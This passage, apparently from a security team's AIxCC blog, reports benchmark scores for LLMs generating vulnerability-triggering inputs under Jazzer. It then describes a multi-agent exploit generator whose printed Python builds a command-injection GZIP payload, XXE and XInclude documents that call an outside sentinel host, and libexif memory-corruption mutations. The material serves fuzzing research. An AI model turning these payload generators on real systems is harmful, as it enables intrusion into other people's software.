effectively, though modern code browsing tools like Cursor or Claude Code probably already implement similar approaches.\nProof of Impact To demonstrate the effectiveness of our context engineering techniques, we conducted systematic evaluation on JenkinsThree (tested 05/29/2025) - our benchmark containing Jenkins repositories tailored for each vulnerability type that Jazzer can detect.\nMethodology: For each vulnerability type, we ran 10 test cases (110 total per model). Each test case used iterative refinement with up to 4 rounds, so the \u0026ldquo;Total Requests\u0026rdquo; varies based on how many iterations were needed to achieve success. These results were obtained exclusively using the BlobGen Agent - our precision-focused agent that combines systematic payload generation with coverage feedback loops.\nDomain Knowledge Integration Evaluation: The results primarily demonstrate the effectiveness of our Domain Knowledge Integration technique by comparing two context versions:\nFinal (R4): Complete vulnerability templates with exploit patterns and triggering mechanisms (JazzerSanitizer_with_exploit.yaml) R2.5 (baseline): Minimal context without domain knowledge (JazzerSanitizer_with_exploit.yaml.backup_r2.5) Context Refinement Journey: Our domain knowledge integration evolved through systematic refinement:\nR1: Basic approach requiring careful sentinel consideration (\u0026lsquo;jazze\u0026rsquo;), categorizing vulnerabilities using sanitizers, and describing how sanitizers detect vulnerabilities R2.5: Enhanced with direct vulnerability descriptions and examples, separate exploit guides with concrete examples, sentinel descriptions, and timeout/infinite vulnerability handling for complex targets like Zookeeper R4 (Final): Mature approach categorizing vulnerabilities based on human expertise rather than just sanitizer output, with concise yet comprehensive descriptions and exploit guides optimized for LLM understanding This comparison (R2.5 → Final) isolates the impact of systematic domain knowledge refinement on LLM vulnerability exploitation capabilities.\nContext Engineering Impact: R2.5 → Final Refinement Vulnerability Type Claude-4 (R2.5 → Final) Claude-3.7 (R2.5 → Final) Impact XPath Injection 10/10 → 10/10 4/10 → 5/10 ✅ Maintained/Improved OS Command Injection 0/10 → 10/10 0/10 → 10/10 🚀 Breakthrough Server Side Request Forgery 6/10 → 8/10 10/10 → 6/10 ✅ Mixed results Regex Injection 3/10 → 10/10 7/10 → 10/10 🚀 Major improvement Remote JNDI Lookup 0/10 → 10/10 0/10 → 10/10 🚀 Breakthrough Reflective Call 0/10 → 10/10 0/10 → 10/10 🚀 Breakthrough SQL Injection 0/10 → 10/10 0/10 → 3/10 🚀 Breakthrough/Major Script Engine Injection 10/10 → 10/10 10/10 → 10/10 ✅ Consistently high LDAP Injection 3/10 → 4/10 7/10 → 10/10 ✅ Improved Remote Code Execution 0/10 → 10/10 0/10 → 10/10 🚀 Breakthrough File Path Traversal 4/10 → 3/10 8/10 → 8/10 📈 With ServletFileUpload: 9/10 Key Insights from Context Refinement:\n🚀 Breakthrough vulnerabilities (0/10 → 10/10): Context engineering enabled discovery of previously impossible-to-reach vulnerabilities, particularly command injection and reflection-based attacks 📊 Consistency across models: Both Claude-4 and Claude-3.7 achieved breakthroughs for the same vulnerability types, validating that improvements come from better context architecture, not model-specific tricks ⚡ Efficiency gains: Final contexts required fewer generation attempts per success, reducing computational costs while improving accuracy 🎯 Precision targeting: File Path Traversal improvements with ServletFileUpload demonstrate how domain-specific knowledge integration creates targeted breakthroughs Model Performance with Final Context Vulnerability Type Claude-4 Claude-3.7 Gemini-2.5-Pro O4-Mini XPath Injection 10/10 5/10 10/10 10/10 OS Command Injection 10/10 10/10 10/10 10/10 Server Side Request Forgery 8/10 6/10 10/10 10/10 Regex Injection 10/10 10/10 10/10 8/10 Remote JNDI Lookup 10/10 10/10 1/10 8/10 Reflective Call 10/10 10/10 9/10 5/10 SQL Injection 10/10 3/10 10/10 9/10 Script Engine Injection 10/10 10/10 10/10 10/10 LDAP Injection 4/10 10/10 6/10 6/10 Remote Code Execution 10/10 10/10 10/10 9/10 File Path Traversal 3/10 8/10 8/10 9/10 Model-Specific Findings:\nClaude-4: Most balanced performer - excelled at injection attacks (SQL, JNDI, Reflective Call) but struggled with File Path Traversal, suggesting strength in complex reasoning over path manipulation Claude-3.7: Complementary strengths to Claude-4 - dominated path-based vulnerabilities (File Path, LDAP) and XPath but weaker on SQL injection, indicating different architectural biases Gemini-2.5-Pro: Strong overall but with notable blind spot in Remote JNDI Lookup (1/10), demonstrating that even high-performing models can have specific vulnerability type weaknesses O4-Mini: Consistently solid across categories with particular strength in File Path Traversal, but weaker on complex reflection-based attacks requiring deeper semantic understanding Model Performance \u0026amp; Usage Metrics (Final Context) Model Success Rate Total Requests Tokens Cost Time (s) Efficiency Score* Claude-4 86.4% (95/110) 168 1.34M $3.99 468 ⭐⭐⭐ High Claude-3.7 83.6% (92/110) 170 1.43M $4.36 491 ⭐⭐⭐ High Gemini-2.5-Pro 85.5% (94/110) 158 2.53M $14.23 2,232 ⭐ Low O4-Mini 85.5% (94/110) 180 2.31M $4.68 1,228 ⭐⭐ Medium *Efficiency combines cost, time, and token usage relative to success rate\nPractical Deployment Insights:\nClaude models offer the best cost-performance ratio for production deployment, achieving high success rates (~85%) with excellent efficiency metrics Gemini-2.5-Pro provides highest raw performance (85.5%) but at 3.5x the cost and 5x the execution time - suitable for scenarios where accuracy trumps efficiency Token efficiency varies significantly: Claude models consume ~1.4M tokens vs 2.3-2.5M for others, suggesting our context engineering techniques are better optimized for Claude\u0026rsquo;s architecture Request efficiency: Lower \u0026ldquo;Total Requests\u0026rdquo; indicates fewer iterations needed per success, showing that effective context engineering reduces the need for multiple refinement rounds These results validate that our systematic approach to context engineering - XML structuring, annotation systems, coverage feedback, and domain knowledge integration - delivers measurable improvements in both effectiveness and efficiency.\nImplementation Guide: Building Context Engineering Systems Ready to build your own context engineering system? Here\u0026rsquo;s the practical roadmap we\u0026rsquo;ve learned from our experience:\nStart with XML Structure Begin with this basic template for any technical context:\n\u0026lt;role\u0026gt;Define the LLM\u0026#39;s identity and mission\u0026lt;/role\u0026gt; \u0026lt;expertise\u0026gt;List relevant domain knowledge areas\u0026lt;/expertise\u0026gt; \u0026lt;objective\u0026gt;Specify exact technical requirements\u0026lt;/objective\u0026gt; \u0026lt;context\u0026gt;Ground the task in specific targets/constraints\u0026lt;/context\u0026gt; \u0026lt;methodology\u0026gt;Explain any annotation or marking systems\u0026lt;/methodology\u0026gt; This structure gives LLMs clear guidance on what they\u0026rsquo;re supposed to do and how to do it.\nAdd Execution Feedback Loops Here\u0026rsquo;s where the magic happens - closing the loop between generation and execution:\nGenerate: LLM produces code based on structured context Execute: Run code in controlled environment with coverage collection Analyze: Compare execution results against intended outcomes Refine: Update context with @VISITED markers and failure information Iterate: Repeat until success or maximum iterations Without this feedback loop, you\u0026rsquo;re essentially asking the LLM to solve problems blindfolded.\nIntegrate Domain Knowledge Contextually Don\u0026rsquo;t dump comprehensive knowledge - be selective and pattern-driven:\nScan code for specific patterns (Runtime.exec, consumeString, etc.) Load corresponding domain knowledge templates Integrate only detected patterns into context Focus on concrete examples over abstract descriptions Think of it as just-in-time learning rather than comprehensive training.\nLimitations and Future Directions AIxCC Constraints and Missed Opportunities During AIxCC, we faced a significant limitation: we couldn\u0026rsquo;t leverage existing vulnerability databases like CVE or Metasploit repositories. The competition\u0026rsquo;s purpose was discovering new vulnerabilities, not exploiting known ones, so historical vulnerability data was off-limits.\nBut here\u0026rsquo;s the exciting part - this constraint actually highlights a massive opportunity. If we could build a system using RAG (Retrieval-Augmented Generation) or Graph-RAG to systematically incorporate vulnerability knowledge bases, we believe the results could be dramatically better. Imagine a system that could:\nRetrieve relevant exploitation patterns from historical CVE data Cross-reference similar vulnerability types and their successful exploitation techniques Build knowledge graphs connecting vulnerability patterns, attack vectors, and target applications Dynamically inject the most relevant historical context for each new target This represents a promising direction for non-competitive security research where such knowledge integration would be both permitted and incredibly valuable.\nFuture Research Opportunities What we\u0026rsquo;ve built represents a fundamental shift in how we approach LLM-based technical problem solving. The techniques we\u0026rsquo;ve developed – XML structuring, annotation systems, coverage feedback, domain knowledge integration – enabled real vulnerability discoveries during AIxCC. But this is just the beginning.\nThe most exciting opportunities ahead include:\nAutomatic Context Optimization: Instead of hand-crafting contexts, imagine systems that learn optimal structures from execution results. The LLM could evolve its own context architecture based on what actually works.\nRAG-Enhanced Context Engineering: Integrating retrieval systems to dynamically pull in relevant vulnerability knowledge and exploitation patterns. Think of it as giving the AI access to a vast library of security expertise in real-time.\nSecurity Domain Expansion: These context engineering techniques could revolutionize vulnerability discovery across different security domains:\nAndroid App Security: Adapting our annotation systems for APK analysis, Intent fuzzing, and permission bypass detection Web Application Security: Extending coverage-driven refinement to browser-based vulnerability discovery and client-side exploitation IoT and Embedded Systems: Applying domain knowledge integration to firmware analysis and hardware-specific attack vectors Cloud Security: Developing context templates for container escapes, serverless vulnerabilities, and infrastructure misconfigurations Data Structures: Grammar-based fuzzing contexts, symbolic constraints from concolic execution, and structured input generation Protocol Security: Network protocol analysis, packet structure templates, and state machine-based vulnerability discovery Next-Generation LLM Integration: As models become more sophisticated, context engineering will evolve to leverage new capabilities while maintaining our systematic approach to information delivery.\nResources \u0026amp; Deep Dives Implementation Examples MLLA Source Code - Complete multi-agent system implementation Domain Knowledge Structures - Data structure handling guides Vulnerability \u0026amp; Exploit Guides - Context templates for vulnerability types Vulnerability Information Templates - R2.5 vs Final context evolution Related Posts 🛠️ BGA: Self-Evolving Exploits Through Multi-Agent AI - Overview of the multi-agent system 🏗️ MLLA: The Complete System - Full architecture details 🗺️ CPUA, MCGA, CGPA: Code Understanding and Navigation - How MLLA discovers and maps vulnerabilities 🔬 BCDA: The AI Detective Separating Real Bugs from False Alarms - How BCDA identifies real vulnerabilities "},{"section":"Blog","slug":"/blog/post-mlla-bga/","title":"BGA: Self-Evolving Exploits Through Multi-Agent AI","description":"How BGA&#39;s multi-agent AI framework creates self-evolving exploits that adapt and improve through coverage feedback - discovering 7 critical vulnerabilities through intelligent iteration","date":"August 29, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/bga_preview_hu_a384038daefd62fe.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/bga_preview_hu_8194fd1d63c99298.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/bga_preview_hu_7d505e55426d7789.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/bga_preview_hu_51057716516498c6.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, exploit-generation, multi-agent, bga","content":"🔄 Where BGA Fits in the MLLA Pipeline Before we dive into BGA\u0026rsquo;s self-evolving exploits, here\u0026rsquo;s how it fits into the broader MLLA vulnerability discovery pipeline:\nDiscovery Agents (CPUA, MCGA, CGPA) → Detective (BCDA) → Exploit Generation (BGA)\nDiscovery agents map the codebase and identify potential vulnerability paths BCDA investigates these paths, filtering false positives and creating Bug Inducing Things (BITs) with precise trigger conditions BGA receives these confirmed vulnerabilities and generates self-evolving exploits to trigger them Now BGA takes the stage, armed with BCDA\u0026rsquo;s detailed intelligence about exactly what conditions must be satisfied to reach each vulnerability.\nWhy Programs Beat Payloads Here\u0026rsquo;s the problem that changed everything: you need an exploit with exactly 1000 \u0026lsquo;A\u0026rsquo; characters followed by shellcode. Ask an LLM to generate it directly, and you might get 847 A\u0026rsquo;s, maybe 1203 A\u0026rsquo;s – never quite right. But ask it to write payload = \u0026quot;A\u0026quot; * 1000 + shellcode, and you get perfection every time.\nThis insight sparked our breakthrough during the AIxCC competition. Instead of hoping AI could guess the right attack data, we taught it to write programs that create that data. The result? Seven unique vulnerabilities discovered - exploits that evolved and adapted until they found their targets.\nThe Blob Generation Agent (BGA) framework works on a simple principle: exploits that can rewrite themselves based on what they learn are far more effective than static attacks. Each agent approaches this self-evolution differently – some refine single payloads through iterative feedback, others generate variations and learn from collective results, still others perform surgical modifications on existing inputs.\nWhat emerged was a system where exploits literally evolve in real-time, getting smarter with each execution until they crack their target.\nBut how did we get there? It started with a fundamental rethink of how AI should approach exploit generation.\nThe Script-Based Breakthrough We kept running into the same problem: traditional vulnerability discovery forced a fundamental trade-off. Generate attacks quickly but blindly, or craft them carefully but rigidly. Fast approaches like random fuzzing rarely penetrate modern validation layers. Careful approaches like hand-crafted exploits break when software changes.\nBGA explored a different path: what if exploits could adapt themselves by generating the programs that create attacks rather than the attacks directly?\ndef create_payload() -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Instead, generate programs that create payloads.\u0026#34;\u0026#34;\u0026#34; # Build complex structures programmatically zip_file = create_zip_structure() xml_content = inject_xxe_payload() manifest = generate_valid_manifest() # Perfect format compliance every time return package_exploit(zip_file, xml_content, manifest) def generate(rnd: random.Random) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Create multiple variations systematically.\u0026#34;\u0026#34;\u0026#34; strategy = rnd.choice([\u0026#39;xxe\u0026#39;, \u0026#39;xinclude\u0026#39;, \u0026#39;schema_injection\u0026#39;]) return create_variant(strategy, rnd) def mutate(rnd: random.Random, seed: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Surgically modify existing inputs.\u0026#34;\u0026#34;\u0026#34; critical_offset = find_vulnerability_trigger(seed) return inject_at_offset(seed, critical_offset, rnd) This shift unlocks several key capabilities: handling arbitrarily complex formats (ZIP, XML, Protocol Buffers), incorporating dynamic values (checksums, lengths, timestamps), documenting reasoning in code comments, iterating based on coverage feedback, and generating thousands of variations from a single strategy.\nOnce we cracked the script-based approach, the next challenge became clear: different vulnerabilities needed different strategies. No single approach would work for everything.\nThe Four Specialists: Brief Overview The BGA framework coordinates four specialist agents, each with a different strategy for creating self-evolving exploits. Rather than competing, they complement each other – covering different vulnerability landscapes through distinct adaptation mechanisms.\n🎭 Orchestrator Agent: The strategic commander that receives vulnerability reports, filters redundant work, and dispatches contexts to specialized agents concurrently. It ensures no resource exhaustion and manages the coordination of all exploitation attempts.\n🎯 BlobGen Agent: The precision sniper that creates Python scripts generating targeted binary payloads. It refines single payloads through up to 4 iterations based on coverage feedback, perfect for known vulnerability paths with strict format requirements.\n🎲 Generator Agent: The probability explorer that creates generator functions producing 20+ payload variations per iteration. It turns LLM non-determinism from weakness into strength through systematic exploration, ideal for complex formats and multiple valid attack paths.\n🔧 Mutator Agent: The surgical specialist that focuses on single function transitions when full vulnerability context would exceed LLM limits. It creates targeted mutations for specific transitions, handling deep call graphs with precision.\nNow let\u0026rsquo;s dive into how we actually built these agents and the engineering challenges we solved along the way.\nBuilding the Agents: The Development Journey 🎭 Orchestrator Agent: Strategic Commander The first challenge we faced wasn\u0026rsquo;t technical – it was logistical. With multiple agents generating exploits concurrently, we needed something to prevent chaos. The Orchestrator Agent emerged as our mission control, turning potential resource conflicts into coordinated strikes.\nThe Orchestrator receives Bug Inducing Things (BITs) from upstream analysis (BCDA) – detailed vulnerability reports with call paths, trigger conditions, and annotated code. But not every BIT deserves attention. The Orchestrator filters aggressively:\nEliminates transitions already covered by previous fuzzing Removes duplicates across different call graphs Filters out paths without conditional branches (no mutation opportunities) Prioritizes high-value targets from recent code changes Once filtered, it transforms raw BITs into specialized contexts for each agent and dispatches work concurrently using asyncio. One BIT might spawn multiple exploitation attempts across different agents, all running in parallel. The Orchestrator ensures no resource exhaustion, no redundant work, and no cascade failures.\n┌─────────────────┐ │ Preprocess │ (Create contexts, determine sanitizers, priority handling) └────────┬────────┘ │ ├───────────────────────┬───────────────────────┐ ▼ ▼ ▼ ┌──────────────────┐ ┌─────────────────┐ ┌──────────────────┐ │ BlobGenAgent │ │ GeneratorAgent │ │ MutatorAgent │ │ (Concurrent) │ │ (Concurrent) │ │ (Concurrent) │ └──────────────────┘ └─────────────────┘ └──────────────────┘ │ │ │ └───────────────────────┼───────────────────────┘ ▼ ┌─────────────────┐ │ Finalize │ (Aggregate results, status reporting) └─────────────────┘ The Orchestrator\u0026rsquo;s workflow demonstrates true concurrent execution: preprocessing contexts, dispatching to all three agents simultaneously, and aggregating results while maintaining system stability through intelligent resource management.\n🎯 BlobGen Agent: The Precision Sniper Some vulnerabilities demand surgical precision – exact timestamps, specific byte sequences, perfect format compliance. BlobGen became our answer to these high-stakes scenarios, iteratively crafting Python scripts until they hit their target with sniper-like accuracy.\nThe Approach: Instead of generating payloads directly, BlobGen creates a Python create_payload() -\u0026gt; bytes function and refines it through up to 4 iterations based on execution results.\n┌──────────────────┐ ┌─────────────────┐ ┌──────────────────┐ │ Generate/Improve │───▶│ Collect │───▶│ Analyze │ │ Payload Script │ │ Coverage │ │ Failure │ └──────────────────┘ └─────────────────┘ └─────────┬────────┘ ▲ │ │ │ ▼ │ │ ┌─────────────────┐ │ │ │ Finalize │◀────────────│ │ └─────────────────┘ │ │ │ └───────────────────────────────────────────────┘ Retry Generation (up to 4 iterations) The iterative refinement loop allows BlobGen to learn from execution feedback and progressively improve its payload generation script until it successfully reaches the target vulnerability.\nExample Approach: Apache Commons Compress GZIP\ndef create_payload() -\u0026gt; bytes: payload = bytearray() # Initial Setup: Create GZIP header structure payload.extend([0x1f, 0x8b]) # GZIP magic bytes (ID1, ID2) payload.append(8) # Compression method (CM) - must be 8 (DEFLATED) payload.append(0x08) # Flags (FLG) - set FNAME bit (0x08) to include filename mtime = 1731695077 # This is the key condition that triggers the vulnerability payload.extend(struct.pack(\u0026#39;\u0026lt;I\u0026#39;, mtime)) # 4 bytes little-endian payload.append(0) # Extra flags (XFL) - can be 0 payload.append(0) # Operating system (OS) - can be any value filename = b\u0026#34;jazze\u0026#34; # The filename \u0026#34;jazze\u0026#34; will be passed to ProcessBuilder constructor payload.extend(filename) payload.append(0) # Null terminator for filename # Add minimal compressed data to avoid EOF exceptions compressed_data = bytes([ 0x03, 0x00, # Minimal deflate block (final, no compression) 0x00, 0x00, 0x00, 0x00, # CRC32 (4 bytes) 0x00, 0x00, 0x00, 0x00 # ISIZE (4 bytes) ]) payload.extend(compressed_data) return bytes(payload) # MUST return only bytes, not tuple/dict Notice the surgical precision: exact modification time, specific filename pattern, proper GZIP structure. BlobGen discovered these requirements through iterative coverage analysis, using the line-level coverage data (file names, function names, and line numbers) to add @VISITED markers and track progress toward the vulnerability.\nWhen BlobGen Wins: Known vulnerability path, strict format requirements, need for precise value combinations.\n🎲 Generator Agent: The Probability Explorer Then we discovered something counterintuitive that changed our whole approach: when you can\u0026rsquo;t predict which attack will succeed, systematic variation beats precision. The Generator Agent emerged from a crucial realization – instead of fighting LLM non-determinism, we could weaponize it.\nThe Approach: Generator creates generate(rnd: random.Random) -\u0026gt; bytes functions that produce 20 variations per iteration. This probabilistic strategy turns LLM non-determinism from weakness into strength through systematic exploration.\n┌──────────────────┐ ┌─────────────────┐ ┌──────────────────┐ │ Plan │───▶│ Create/Improve │───▶│ Collect │ │ Generator │ │ Generator │ │ Coverage │ └──────────────────┘ └─────────────────┘ └─────────┬────────┘ ▲ │ ┌─────────────────────────▶│ │ │ │ ▼ │ ┌─────────────────┐ ┌──────────────────┐ │ │ Analyze │◀───│ Update │ │ │ Coverage │ │ Interesting │ │ └────────┬────────┘ │ Functions │ │ │ └──────────────────┘ │ ▼ │ ┌─────────────────┐ │ │ Finalize │ │ └─────────────────┘ │ Iterative Improvement Loop (20 variations per iteration) The probabilistic approach generates multiple variations and learns from collective coverage patterns, dramatically increasing the likelihood of reaching target vulnerability points that single-attempt strategies often miss.\nExample Approach: Apache Tika XXE Attack Suite\ndef generate(rnd: random.Random) -\u0026gt; bytes: # ... # Phase 1: Create valid ZIP structure to reach parseRoot strategy = rnd.choice([\u0026#39;basic_xxe\u0026#39;, \u0026#39;xinclude\u0026#39;, \u0026#39;schema_ref\u0026#39;, \u0026#39;dtd_external\u0026#39;]) # Generate root filename root_filename = rnd.choice([\u0026#39;root.xml\u0026#39;, \u0026#39;data.xml\u0026#39;, \u0026#39;content.xml\u0026#39;, \u0026#39;main.xml\u0026#39;]) # Create Manifest.xml content manifest_content = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;manifest\u0026gt;\u0026lt;Root\u0026gt;{root_filename}\u0026lt;/Root\u0026gt;\u0026lt;/manifest\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) # Phase 2: Generate exploit payload based on strategy if strategy == \u0026#39;basic_xxe\u0026#39;: # XXE with external entity targeting jazzer.com port = rnd.choice([80, 443, 8080, 8443]) path = rnd.choice([\u0026#39;\u0026#39;, \u0026#39;/test\u0026#39;, \u0026#39;/data.xml\u0026#39;, \u0026#39;/api/endpoint\u0026#39;, \u0026#39;/config\u0026#39;]) root_content = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://jazzer.com:{port}{path}\u0026#34;\u0026gt;]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;xxe;\u0026lt;/root\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) elif strategy == \u0026#39;xinclude\u0026#39;: # XInclude attack targeting jazzer.com path = rnd.choice([\u0026#39;/data.xml\u0026#39;, \u0026#39;/config.xml\u0026#39;, \u0026#39;/api/data\u0026#39;, \u0026#39;/external.xml\u0026#39;]) protocol = rnd.choice([\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;]) root_content = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;root xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;xi:include href=\u0026#34;{protocol}://jazzer.com{path}\u0026#34;/\u0026gt; \u0026lt;/root\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) # ... (other strategies) ... # Build ZIP file structure files = [ (\u0026#39;Manifest.xml\u0026#39;, manifest_content), (root_filename, root_content) ] # Add random additional files occasionally if rnd.random() \u0026lt; 0.3: extra_content = b\u0026#39;\u0026lt;extra\u0026gt;data\u0026lt;/extra\u0026gt;\u0026#39; files.append((\u0026#39;extra.xml\u0026#39;, extra_content)) return create_zip(files, rnd) # ... (helper functions) ... Why Generator Dominates:\nProbabilistic Success: If attempt #7 fails but #13 succeeds, you still win Format Mastery: Handles ZIP + XML + XXE simultaneously Strategic Variation: Not random – intelligent exploration of attack space Coverage Merger: Learns from ALL 20 variations, not just successes The probabilistic approach overcomes LLM non-determinism by embracing it rather than fighting it.\nWhen Generator Wins: Complex formats, multiple valid approaches, exploration over precision.\n🔧 Mutator Agent: The Surgical Specialist The final breakthrough came when we hit a wall: some vulnerability paths were so complex that even the most capable LLMs couldn\u0026rsquo;t hold the entire context. The Mutator Agent\u0026rsquo;s solution was elegantly simple – focus on single transitions between functions rather than trying to comprehend the whole picture.\nThe Strategy: Mutator creates mutate(rnd: random.Random, seed: bytes) -\u0026gt; bytes functions that surgically target specific function-to-function transitions. This focused approach handles large codebases by concentrating on precise transition points.\n┌─────────────────┐ │ Plan │ │ Mutation │ └────────┬────────┘ │ ▼ ┌──────────────────┐ ┌─────────────────┐ ┌─────────────────┐ │ Create/Improve │───▶│ Analyze │───▶│ Finalize │ │ Mutator │ │ Mutator │ │ │ └──────────────────┘ └────────┬────────┘ └─────────────────┘ ▲ │ │ │ └───────────────────────┘ Improvement Loop (focused on single transitions) The focused analysis loop concentrates on single function transitions, making it effective when full vulnerability context would overwhelm LLM context limits while still enabling precise payload mutations.\nExample Approach: libexif Memory Corruption\ndef mutate(rnd: random.Random, seed: bytes) -\u0026gt; bytes: # ... exif_pos = seed.find(b\u0026#39;Exif\\x00\\x00\u0026#39;) tiff_start = exif_pos + 6 # ... (boundary checks) ... makernote_pos = _find_makernote_start(seed, tiff_start) if makernote_pos == -1: makernote_pos = min(tiff_start + 64, len(seed)) prefix = seed[:makernote_pos] body = seed[makernote_pos:] # 30% chance for generic mutations to maintain diversity if rnd.random() \u0026lt; 0.3: return _generic_mutate(rnd, seed) # Apply format-specific mutations to Makernote section mutated_body = _mutate_makernote(rnd, body) result = prefix + mutated_body return result[:min(len(result), 102400)] def _mutate_makernote(rnd, body): strategy = rnd.randint(0, 5) if strategy == 0: return _mutate_signature(rnd, body) elif strategy == 1: return _mutate_endianness(rnd, body) elif strategy == 2: return _mutate_directory(rnd, body) # Corrupt directory counts and field types elif strategy == 3: return _mutate_sizes(rnd, body) # Create oversized data fields elif strategy == 4: return _mutate_offsets(rnd, body) # Corrupt offset values for out-of-bounds access else: return _byte_mutations(rnd, body) # ... (mutation strategy implementations) ... Why Mutator Succeeded: When dealing with deep call chains where understanding the full context would overwhelm even the most capable LLM, Mutator\u0026rsquo;s focused approach shines. It doesn\u0026rsquo;t need to understand the entire vulnerability – just how to navigate from function A to function B.\nWhen Mutator Wins: Deep call graphs, context limitations, specific transition requirements.\nAfter months of development, we were ready to put BGA to the ultimate test: the AIxCC competition against some of the world\u0026rsquo;s best security teams.\nCompetition Results and Technical Analysis Seven Critical Discoveries The AIxCC competition became our proving ground. When the dust settled, BGA had discovered 7 unique vulnerabilities – genuine bugs in production software that other approaches had completely missed. Each discovery validated a different aspect of our multi-agent approach.\nAgent Vulnerabilities Found Approach Generator 4 PoVs Probabilistic exploration with 20+ variations BlobGen 2 PoVs Iterative refinement with coverage feedback Mutator 1 PoV Surgical targeting of function transitions Total 7 PoVs Multi-agent coordination These discoveries validate the multi-agent, script-based approach, though the specific code examples shown throughout this post come from earlier development and rounds, illustrating how the techniques work in practice.\nWhy Multiple Agents Were Necessary A critical question emerged during development: if Generator was finding the most bugs, why not just use it for everything? The answer revealed a fundamental insight about vulnerability exploitation – different bug classes require completely different evolutionary strategies.\nThe Orchestrator coordinates this by analyzing each vulnerability candidate and dispatching appropriate agents concurrently. Some vulnerabilities need surgical precision, others benefit from probabilistic exploration, and still others require iterative refinement. Rather than forcing one approach on all problems, the multi-agent system lets each strategy handle what it does best while running in parallel through intelligent orchestration.\nThe Technical Breakthroughs Behind Our Success Looking back, several key innovations emerged that we believe enabled these discoveries:\nThe Script-Based Revolution: Our core breakthrough was teaching LLMs to generate Python programs instead of raw payloads. This paradigm shift unlocked complex format handling, dynamic value incorporation, and self-documenting exploit logic.\nProbabilistic Exploration Strategy: The Generator approach embraces systematic variation rather than hoping for deterministic success:\n# Traditional approach often fails: perfect_payload = generate_perfect() # Multi-variation approach: try systematic alternatives for i in range(20): variant = generate(random.Random(seed + i)) result = execute(variant) coverage.merge(result) # Learn from ALL attempts Collective Learning from Execution: Rather than learning only from successes, the system analyzes patterns across all variations, merging coverage data from multiple payload attempts to understand which strategies are making progress toward the target vulnerability.\nCoverage-Guided Evolution: We used line coverage information consisting of hit file name, function name, and line number to guide the LLM evolution process. While this coverage data wasn\u0026rsquo;t always perfectly accurate, it provided crucial intelligence that helped our agents understand which parts of the target code were being reached and which critical paths remained unexplored. BlobGen used structured feedback showing exactly which vulnerability conditions were hit versus missed, while Generator tracked collective coverage patterns across all 20+ variations to understand which strategies were making progress toward targets.\nThese innovations proved especially effective against the types of vulnerabilities we encountered, which shared several challenging characteristics:\nFormat Complexity: Multi-layer format requirements (valid ZIP containing valid XML containing valid XXE) that challenge traditional random approaches Semantic Requirements: Understanding that specific functions execute commands or that certain values trigger vulnerabilities Precision Constraints: Exact checksums, specific string patterns, correct binary structures Multiple Valid Attack Paths: Different strategies leading to the same vulnerability We believe traditional approaches would require millions of attempts to accidentally discover these combinations, while the self-evolving approach found them more systematically through code understanding, execution feedback, and adaptive strategy refinement.\nReflecting on this journey, several key insights emerged that go beyond just the technical implementation.\nLessons Learned: Key Insights from Development Developing BGA revealed several critical insights about LLM-based security research and multi-agent coordination:\nContext Management and LLM Limitations One of our biggest revelations was that LLM context limitations aren\u0026rsquo;t just about token counts – they\u0026rsquo;re about meaningful reasoning boundaries. The Mutator Agent\u0026rsquo;s focused transition analysis emerged from recognizing that trying to understand entire call graphs often overwhelmed the LLM\u0026rsquo;s ability to provide precise analysis. By concentrating on single function transitions, we achieved surgical precision that wouldn\u0026rsquo;t be possible with broader context.\nThe Power of Indirection Perhaps our most transformative insight was realizing that the best way to get what you want from an LLM isn\u0026rsquo;t always to ask for it directly. By asking for executable exploit recipes rather than raw exploits, we discovered we could leverage LLM strengths (code generation and logical reasoning) while sidestepping their weaknesses (precise binary format construction).\nMulti-Agent Coordination Challenges We quickly learned that coordinating multiple LLM agents creates entirely new classes of problems that simply don\u0026rsquo;t exist in single-agent systems. Building effective multi-agent orchestration required breakthroughs in several areas:\nFault Isolation is critical – one agent\u0026rsquo;s failure cannot cascade to others, requiring careful async error handling Resource Management through semaphore-based concurrency control prevents system exhaustion while maintaining parallelism Context Transformation requires 